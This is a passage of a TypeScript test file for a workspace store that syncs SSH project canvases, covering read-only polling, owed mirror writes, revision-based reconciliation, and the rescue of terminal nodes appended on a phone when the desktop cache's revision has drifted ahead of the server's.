    io.write = async (id: string, ssh: any, c: string) => (writes.push(id), origWrite(id, ssh, c))
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])) // reconcile + push rev 1
    const writesAfterSave = writes.length

    // The phone appends a node and bumps rev (same project id = same lineage).
    const f = JSON.parse(files['~/app'])
    f.rev = 2
    f.nodes = [...f.nodes, { id: 'term-mobile-1', kind: 'terminal', position: { x: 0, y: 700 }, size: { width: 1, height: 1 }, title: 'Mobile', color: '#fff', group: null }]
    files['~/app'] = JSON.stringify(f)

    const adopted = await store.refreshSshProject('ps', { pushIfStanding: false })
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-mobile-1')
    expect(writes.length).toBe(writesAfterSave) // read-only poll

    // Unchanged remote → the next poll decides nothing and writes nothing.
    expect(await store.refreshSshProject('ps', { pushIfStanding: false })).toBeNull()
    expect(writes.length).toBe(writesAfterSave)
  })

  it('poll: still retries a mirror write that is owed (pushIfStanding:false does not cancel debts)', async () => {
    const files: Record<string, string> = {}
    let up = false
    const io = {
      read: async (_id: string, ssh: any) => {
        if (!up) return { status: 'error' as const }
        return files[ssh.remoteCwd] != null
          ? { status: 'ok' as const, content: files[ssh.remoteCwd] }
          : { status: 'absent' as const }
      },
      write: async (_id: string, ssh: any, c: string) => (up ? ((files[ssh.remoteCwd] = c), true) : false)
    }
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])) // down: owed
    up = true
    expect(await store.refreshSshProject('ps', { pushIfStanding: false })).toBeNull()
    expect(files['~/app']).toContain('"id": "ps"') // the owed mirror landed on the poll
  })

  it('sshProjectIds lists the ssh entries (the poll iterates these)', async () => {
    const { io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined }), project({ id: 'p2', name: 'inline' })]))
    expect(store.sshProjectIds()).toEqual(['ps'])
  })

  it('same-lineage reconcile is untouched: an emptier remote with a higher rev still wins (user cleared their canvas)', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined })])) // rev 1, mirrored
    const cleared = JSON.parse(files['~/app'])
    cleared.rev = 7
    cleared.nodes = [] // the same project id, deliberately emptied on another machine
    files['~/app'] = JSON.stringify(cleared)
    const adopted = await store.refreshSshProject('ps')
    expect(adopted).toMatchObject({ id: 'ps' })
    expect(adopted!.nodes).toHaveLength(0)
  })

  // The FIELD BUG: a phone-created session (in an SSH project's folder on a server) never reached
  // the desktop canvas. The phone appends its node to the server's project.json and bumps rev vs the
  // file it read — but the desktop's CACHE rev can drift AHEAD of the server (a dropped/forgotten
  // final mirror write, or an offline edit), so a rev-only decision discards the phone's node and the
  // standing cache clobbers the server. Same-lineage must UNION remote-only session nodes, not lose
  // them. Guarded to both-sides-populated so the "user cleared their canvas" case above still wins.
  const node = (id: string, title: string) => ({
    id, kind: 'terminal' as const, position: { x: 0, y: 0 }, size: { width: 1, height: 1 },
    title, color: '#fff', group: null
  })
  it('rescues a mobile-appended node when our cache rev has drifted ahead of the server', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })])) // rev 1
    // Two local edits drift our cache to rev 3 (the last mirror write is imagined dropped below).
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 'edit1')] })])) // rev 2
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 'edit2')] })])) // rev 3
    // The server is BEHIND our cache (rev 2, dropped final mirror) and the phone appended a session to it.
    files['~/app'] = JSON.stringify({
      version: 1, rev: 2, savedAt: 'then', id: 'ps', name: 'foo', color: '#7aa2f7',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [node('term-1', 'edit2'), node('term-mobile-1', 'Mobile')]
    })
    const adopted = await store.refreshSshProject('ps')
    // The phone's session reaches the live canvas...
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-mobile-1')
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-1') // and our own node survives too
    // ...and the merged set is pushed back so the server keeps it.
    expect(JSON.parse(files['~/app']).nodes.map((n: any) => n.id)).toContain('term-mobile-1')
  })

  it('poll (read-only stand) still rescues + surfaces a drifted mobile append', async () => {
    const { files, io } = cwdIO()
    const store = new WorkspaceStore(io)
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 't')] })])) // rev 1
    await store.save(ws([project({ id: 'ps', ssh: sshConn, cwd: undefined, nodes: [node('term-1', 'edit')] })])) // rev 2
    files['~/app'] = JSON.stringify({
      version: 1, rev: 1, savedAt: 'then', id: 'ps', name: 'foo', color: '#7aa2f7',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [node('term-1', 'edit'), node('term-mobile-1', 'Mobile')]
    })
    const adopted = await store.refreshSshProject('ps', { pushIfStanding: false })
    expect(adopted?.nodes.map((n) => n.id)).toContain('term-mobile-1')
  })
})
